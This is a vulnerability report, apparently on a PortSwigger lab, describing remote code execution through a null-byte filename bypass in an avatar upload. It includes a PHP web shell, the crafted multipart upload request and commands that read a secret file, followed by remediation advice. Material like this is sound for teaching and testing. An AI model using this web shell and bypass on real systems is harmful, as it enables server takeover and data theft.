# Vulnerability Report: Remote Code Execution via File Upload Extension Bypass

**Severity:** Critical  
**CVSS Score:** 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)  
**Date:** 2026-08-06  
**Target:** TARGET.web-security-academy.net

## Executive Summary
A Remote Code Execution vulnerability was identified in the avatar upload functionality of the application.
The upload filter blocks `.php` files by checking the filename extension, but fails to account for null byte injection.
By injecting a null byte (`%00`) into the filename — `shell.php%00.png` — the validation layer sees a `.png` extension and passes the file, while the server-side execution layer truncates at the null byte and processes it as `.php`.
The uploaded file is served at a static, predictable path with direct access, allowing the attacker to execute arbitrary OS commands through a simple web shell.
This was used to achieve full RCE: read arbitrary files, run system commands, and exfiltrate sensitive data from the server.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Unrestricted File Upload via Null Byte Extension Bypass |
| Endpoint | `POST /my-account/avatar` |
| Method | POST |
| Vulnerable Parameter | `filename` (multipart body) |
| Filter | Blocks uploads where filename does not end in `.jpg` or `.png` |
| Bypass | Null byte (`%00`) causes validation layer to see `.png` while execution layer truncates to `.php` |
| Access Type | Direct static path — uploaded file is publicly accessible by URL |
| Privileges Required | Low (authenticated user account) |
| User Interaction | Not required |

## Steps to Reproduce
1. Log in to the application with a valid user account.
2. Navigate to the profile page and locate the avatar upload functionality.
3. Prepare a PHP web shell:
```php
<?php system($_GET['command']) ?>
```
4. Save the file as `shell.php` and attempt to upload it — confirm the server returns an error ("only JPG and PNG files are allowed").
5. Intercept the upload request in Burp Suite and modify the `filename` field in the multipart body:
```
filename="shell.php%00.png"
```
6. Forward the modified request — confirm the server returns a success response.
7. Locate the static path to the uploaded file by inspecting the profile page HTML source.
8. Send a GET request to the file URL with an OS command in the `command` parameter:
```http
GET /files/avatars/shell.php?command=id HTTP/2
Host: TARGET.web-security-academy.net
```
9. Confirm OS command output is returned in the response body — RCE achieved.
10. Read the target file:
```http
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
Host: TARGET.web-security-academy.net
```

## Proof of Concept
```http
POST /my-account/avatar HTTP/2
Host: TARGET.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.png"
Content-Type: image/png

<?php system($_GET['command']) ?>
------WebKitFormBoundary--
```

Followed by:
```http
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
Host: TARGET.web-security-academy.net
```

## Impact
An authenticated attacker can achieve full Remote Code Execution on the server by uploading a PHP web shell through the avatar upload feature.
The extension filter is trivially bypassed using a null byte injection — a technique that has been known for decades.
Once the shell is uploaded and the static path is known, the attacker has unrestricted access to the OS environment.
This can lead to:
- Arbitrary file read — sensitive configs, credentials, private keys, user data
- Full OS command execution under the web server's process privileges
- Internal network reconnaissance from the server
- Reverse shell for persistent, interactive access
- Privilege escalation depending on server configuration
- Complete compromise of the host and any systems reachable from it

## Remediation
- Validate file content server-side using magic bytes — do not rely on the `Content-Type` header or the `filename` field, both of which are fully attacker-controlled
- Use an explicit extension whitelist — only permit `.jpg` and `.png`; reject everything else including obfuscated variants
- Rename uploaded files server-side to a random UUID before storing — even if a `.php` file is uploaded, the attacker cannot reach it without knowing the path
- Serve uploaded files from a separate origin (S3, CDN, isolated domain) so the PHP execution context does not apply
- Disable script execution in upload directories at the server config level (e.g., `.htaccess` or Nginx config) as a last line of defense
- Normalize and fully decode filenames before any validation check — never compare raw user-supplied strings against a filter

## References
- OWASP: Unrestricted File Upload
- CWE-434: Unrestricted Upload of File with Dangerous Type
- PortSwigger: File upload vulnerabilities — web shell upload via obfuscated file extension